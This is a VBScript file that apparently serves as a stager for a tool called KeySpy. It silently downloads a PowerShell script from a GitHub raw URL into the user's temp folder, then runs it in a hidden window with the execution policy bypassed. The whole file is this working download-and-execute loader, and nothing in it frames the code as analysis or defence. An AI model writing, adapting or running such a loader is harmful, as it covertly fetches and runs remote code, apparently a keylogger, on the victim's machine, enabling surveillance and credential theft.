Set objShell = CreateObject("WScript.Shell")

' Define the URL of the PowerShell script
scriptUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/initial.ps1"

' Define the destination folder
destinationFolder = objShell.ExpandEnvironmentStrings("%TEMP%")

' Download the PowerShell script silently
objShell.Run "cmd /c powershell.exe -ExecutionPolicy Bypass -Command ""(New-Object System.Net.WebClient).DownloadFile('" & scriptUrl & "', '" & destinationFolder & "\initial.ps1')""", 0, True

' Execute the PowerShell script silently
objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & destinationFolder & "\initial.ps1""", 0, True
